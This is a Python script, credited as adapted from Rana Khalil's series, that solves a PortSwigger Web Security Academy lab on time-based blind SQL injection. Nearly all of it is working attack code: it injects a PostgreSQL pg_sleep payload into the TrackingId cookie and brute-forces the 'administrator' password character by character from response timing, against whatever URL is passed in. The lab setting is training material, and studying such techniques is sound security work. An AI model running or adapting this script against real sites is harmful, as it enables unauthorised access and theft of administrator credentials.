#-----------------------------------------------------------------------------------------------------------------------#
# Source script:                                                                                                        # 
#   Rana Khalil (https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-14/sqli-lab-14.py) #
#                                                                                                                       #
# Rana's video walkthrough:                                                                                             #
#   https://www.youtube.com/watch?v=6RQDafoyfgQ                                                                         #
#                                                                                                                       #
# Lab link:                                                                                                             #
#   https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval                             #
#                                                                                                                       #
# Description:                                                                                                          #
#   This code was adapted from the above and modified by kuv4z (https://github.com/CSpanias) as a solution for the      #
#   aforementioned PortSwigger's Lab. PortSwigger's solution is based on Burp Intruder which is extremely slow in       #
#   Community Edition, and this represents a much faster way to brute-force the password of the user 'administrator'.   #
#                                                                                                                       #
# Changes:                                                                                                              #
#   1. Removed proxies.                                                                                                 #
#   2. Created and used alphanumeric lists directly instead of using ASCII representations.                             #
#   3. Used simplified payload.                                                                                         #
#   4. Automated cookie grabbing.                                                                                       #
#   5. Added comments throughout the code.                                                                              #
#-----------------------------------------------------------------------------------------------------------------------#

import sys
import requests
import urllib3
import urllib.parse
import string

# disable certificate-related warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# create a list with all lowercase alphabetic characters
alpha_list = [i for i in string.ascii_lowercase]
# create a list with numeric characters
num_list = [str(i) for i in range(10)]
# combine the two lists
char_list = alpha_list + num_list

def sqli_password(url):
    password_extracted = ""
    # try every position based on the length of the password
    for i in range(1,21):
        # try every character from our character list
        for j in char_list:
            # define the payload to be injected
            sqli_payload = f"' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{j}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--"
            # URL encode the payload
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            
            # get the cookies of the HTTP GET request
            session = requests.Session()
            response = session.get(url)
            TrackingId = session.cookies.values()[0]
            session = session.cookies.values()[1]
            
            # inject the payload to the 'TrackingId' value
            cookies = {'TrackingId' : TrackingId + sqli_payload_encoded,
                       # set the session cookie
                       'session' : session}
            
            # define the HTTP GET request
            r = requests.get(
                # the URL to make the GET request to
                url,
                # pass the defined cookie to the request
                cookies=cookies,
                # do not verify certificates 
                verify=False)
            
            # get the response time in total seconds
            response_time = int(r.elapsed.total_seconds())
            
            # if we the response takes more than 10 seconds,
            # that confirms that a character is found
            if response_time > 9:
                # keep the letter found for this position 
                password_extracted += j
                # output the character to the screen
                sys.stdout.write('\r' + password_extracted)
                # flush the letter
                sys.stdout.flush()
                # get out of the second for loop and back to the first 
                break
            else:
                sys.stdout.write('\r' + password_extracted + j)
                sys.stdout.flush()

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit()
        
        
    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

# execute the main function
if __name__ == "__main__":
    main()